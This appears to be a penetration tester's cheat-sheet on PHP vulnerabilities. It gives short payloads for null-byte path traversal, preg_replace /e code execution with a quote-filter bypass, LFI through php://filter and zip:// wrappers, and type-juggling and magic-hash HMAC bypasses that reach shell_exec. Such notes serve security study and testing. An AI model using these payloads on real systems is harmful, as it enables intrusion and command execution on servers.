# PHP

## References
- [Understanding PHP Object Injection](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)
- https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/
- https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/
- http://pentestmonkey.net/tools/web-shells/php-reverse-shell
- [PHP Remote File Inclusion command shell using data://](https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/)
- [Hardening and securing PHP on Linux](https://www.idontplaydarts.com/2011/02/hardening-and-securing-php-on-linux/)


- [HTTP Parameter Pollution with cookies in PHP](https://www.idontplaydarts.com/2013/06/http-parameter-pollution-with-cookies-in-php/)

## Terminate strings using null byte

Before `PHP 5.3` terminate strings using null byte is possible (%00 in URL)
```
http://example.com?param=../../../../etc/passed
  -> /etc/passed.php
http://example.com?param=../../../../etc/passed%00
  -> /etc/passed
```

## Vulnerable functions

Local / Remote file inclusion bugs:
```
include()
include_once()
require()
require_once()
```

Local / Remote command execution bugs:
```
eval()
preg_replace()
fwrite()
passthru()
file_get_contents()
shell_exec()
system()
```

SQL Injection bugs:
```
mysql_query()

```

File / File system bugs:
```
fopen()
readfile()
glob()
file()
popen()
exec()
```

> https://0xzoidberg.wordpress.com/2010/05/26/vulnerable-php-functions/

## RCE with PREG Functions

- implement regular expressions for the preg_ functions (preg_match, preg_replace)
- `/e` modifier which allows evaluation of PHP code in the preg_replace

Example:
```
<?php
$string = "this is my lower sting";
print preg_replace('/(.*)/e', 'strtoupper("\\1")', '$string');
?>

// THIS IS MY LOWER STING
```

Example Attack:
```
<?php
$string = "phpinfo()";
print preg_replace('/^(.*)/e', 'strtoupper(\\1)', $string);
?>
```

Filter Evasion:
- Prevent single quote and escape chars
```
Following will fail:
  $string = "system('ls -lah')";

Bypass:
  $string = "`ls -lah`";
```

> - Ref: http://www.madirish.net/402

## LFI with Filter Inclusion

- Useful when LFI is possible but ".php" is appended at end (and not vulnerable to null byte injection)
- `filter/convert.base64-encode` forces PHP to base64 encode the file before it is used in the require statement (`index​.php`)
```
http://example.com/?page=php://filter/convert.base64-encode/resource=index​
```

## LFI with Zip Inclusion (Include a file inside a zip)

- If it is possible to upload a zip file

```
http://example.com/?page=zip://uploads/zipfilename#shell.php?cmd=id
```

## LFI to RFI

- Possible if `allow_url_include` is on

## Type Juggling

References:
- [https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf](https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf)
- [https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/](https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/)
- [https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro](https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro)
- [https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing](https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing)

![1558284487209](_assets/PHP_loose_comparisons.png)

![](<_assets/table_representing_behavior_of_PHP_with_loose_type_comparisons.png>)

```
'0e1234' == '0e4321'
'0e1234' == '0'
'0e1234' <= '1'
'0xf' == '15' #0xf in hexadecimal notation is 15
```

```
'000...000' == int(0)
'0e0...000' == int(0)
'1e0...000' == int(1)
'0abc...000' == int(0)
'abc...000' == int(0) # if a string starts with a non numerical character it will default to int(0)
```

```
var_dump("2 bottles" == 2); // ==> TRUE

$values = array("apple","orange","pear","grape");
in_array(0, $values); // ==> TRUE

if($password == "secretpass")   // ==> TRUE when $password=0
```

### Reduction in Entropy (Insecure HMAC)

```
$secret = 'secure_random_secret_value';
$hmac = md5($secret . $_POST['message']);
if($hmac == $_POST['hmac'])    
		// ===> Bypass by creating a hmac starting with `0e[0-9]`
		// var_dump("0e123" == "0e51217526859264863"); ===> TRUE
        shell_exec($_POST['message']);
```

### Hashing Algorithm Disclosure

Given 240610708 and QNKCDZO attacker can guess that hashing algo is `md5`

```
var_dump(md5('240610708') == md5('QNKCDZO'));  ===> TRUE
```
